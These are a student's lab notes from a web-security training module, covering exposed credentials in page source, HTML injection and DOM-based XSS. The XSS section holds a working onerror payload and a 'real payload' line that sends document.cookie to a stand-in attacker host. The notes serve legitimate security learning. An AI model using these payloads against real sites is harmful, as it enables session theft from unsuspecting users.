# \# Lab Notes — Module 02 Introduction to Web Applications

# 

# \---

# 

# \## Lab 01 — Sensitive Data Exposure

# 

# \*\*Objective:\*\* Find hidden credentials in page source

# 

# \*\*What I Did:\*\*

# Opened the login page and pressed `Ctrl + U` to view page source.

# Searched through the HTML and found a developer comment that was

# never removed before deployment.

# 

# \*\*Finding:\*\*

# ```html

# <!--TODO: remove test credentials admin:HiddenInPlainSight-->

# ```

# 

# \*\*Result:\*\* Logged in successfully with `admin:HiddenInPlainSight`

# 

# !\[Sensitive Data Exposure](Screenshots/sensitive\_data\_exposure.PNG)

# 

# \*\*Key Observation:\*\*

# Developers leave TODO comments in production code more often than

# you'd think. Page source is always step one — before touching

# any input field or running any tool.

# 

# \---

# 

# \## Lab 02 — HTML Injection

# 

# \*\*Objective:\*\* Inject HTML into an unsanitized input field

# 

# \*\*What I Did:\*\*

# Clicked the name prompt button. Instead of entering a name,

# injected an HTML anchor tag directly into the input field.

# 

# \*\*Payload Used:\*\*

# ```html

# <a href="http://www.hackthebox.com">Click Me</a>

# ```

# 

# \*\*Result:\*\* The link rendered on the page as a clickable element.

# Browser treated the input as raw HTML — not plain text.

# 

# !\[HTML Injection](Screenshots/HTML\_Injection.PNG)

# 

# \*\*Key Observation:\*\*

# If a field renders HTML it will likely render JavaScript too.

# HTML Injection is the first confirmation that XSS is possible.

# The payload was visible in the prompt exactly as typed —

# no encoding, no filtering, no sanitization whatsoever.

# 

# \---

# 

# \## Lab 03 — Cross-Site Scripting (XSS)

# 

# \*\*Objective:\*\* Execute JavaScript via unsanitized input to steal cookie

# 

# \*\*What I Did:\*\*

# Used the same name prompt from the HTML Injection lab.

# Injected a DOM XSS payload that triggers on image load error.

# 

# \*\*Payload Used:\*\*

# ```javascript

# \#"><img src=/ onerror=alert(document.cookie)>

# ```

# 

# \*\*Result:\*\* Alert box popped with the session cookie value.

# JavaScript executed entirely in the browser — server never saw it.

# 

# !\[XSS Cookie Steal](Screenshots/XSS.PNG)

# 

# \*\*Key Observation:\*\*

# The same field that accepted HTML injection accepted JS execution.

# DOM XSS does not need a server round trip — it runs locally in

# the victim's browser. A real attacker would send the cookie to

# their own server instead of alerting it.

# Real payload would be:

# ```javascript

# \#"><img src=/ onerror=fetch('http://attacker.com/?c='+document.cookie)>

# ```

# 

# \---

# 

# \## Overall Lab Takeaways

# 

# \- Page source before anything else — credentials hide in comments

# \- HTML rendering = gateway to XSS, always test further

# \- DOM XSS needs no server interaction — pure client side execution

# \- The three labs chain naturally: expose → inject → execute

# \- Same input field, escalating payloads, increasing impact

